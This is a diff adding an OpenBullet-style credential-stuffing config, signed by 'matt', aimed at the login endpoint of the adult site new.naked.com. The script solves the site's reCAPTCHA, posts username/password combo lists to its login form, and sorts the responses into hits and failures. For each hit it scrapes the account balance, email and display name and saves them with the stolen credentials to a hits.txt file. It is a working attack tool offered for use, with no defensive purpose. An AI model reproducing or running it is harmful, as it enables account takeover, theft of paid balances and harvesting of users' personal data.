@@ -1,0 +1,98 @@
+[SETTINGS]
+{
+  "Name": "Naked.com by matt",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-12T14:54:29.1472691+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Folder where you want to save your hits.",
+      "VariableName": "Path",
+      "Id": 2137343581
+    }
+  ],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+RECAPTCHA "https://new.naked.com/index.php?s=user.register.ajxLogin" "6LegBzcUAAAAAPirN4VaQUOO9KIB6zk7O7y70Jdx" -> VAR "Captcha" 
+
+#Login REQUEST POST "https://new.naked.com/index.php?s=user.register.ajxLogin" 
+  CONTENT "captchaAuth=&skeycap=&layout=&referer=&sub=login&username=<USER>&pass=<PASS>&setcookie_ucredentials=1&keyCap=&freeRegister=&mname=&g-recaptcha-response=<Captcha>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: new.naked.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 2178" 
+  HEADER "Accept: text/plain, */*; q=0.01" 
+  HEADER "X-NewRelic-ID: VQMPWVVXDhABUVBaBwcPU1E=" 
+  HEADER "Origin: https://new.naked.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.43" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Referer: https://new.naked.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: cs-CZ,cs;q=0.9" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username/password " 
+  KEYCHAIN Retry OR 
+    KEY "Please check \"I'm not a robot\" " 
+
+#Capture REQUEST GET "https://new.naked.com/index.php?s=user.myAccount.accountBalance" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Balance PARSE "<SOURCE>" LR "have <b>" "</b>" -> CAP "Balance" 
+
+#Capture REQUEST GET "https://new.naked.com/user/my-account/my-personal-data" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Email PARSE "<SOURCE>" LR "<td>email</td>" "</td>" -> VAR "Email" 
+
+#Fix FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "<td>" VALUE "" 
+  "<Email>" -> CAP "Email" 
+
+#Name PARSE "<SOURCE>" LR "<td>displayname</td>" "</td>" -> VAR "Name" 
+
+#Fix FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "<td>" VALUE "" 
+  "<Name> | made by matt" -> CAP "Name" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Balance>" DoesNotContain "0" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Balance>" Contains "0" 
+
+#Save UTILITY File "<Path>\\hits.txt" AppendLines "<USER>:<PASS> | Balance = <Balance> | Email = <Email> | Name = <Name>" 
+
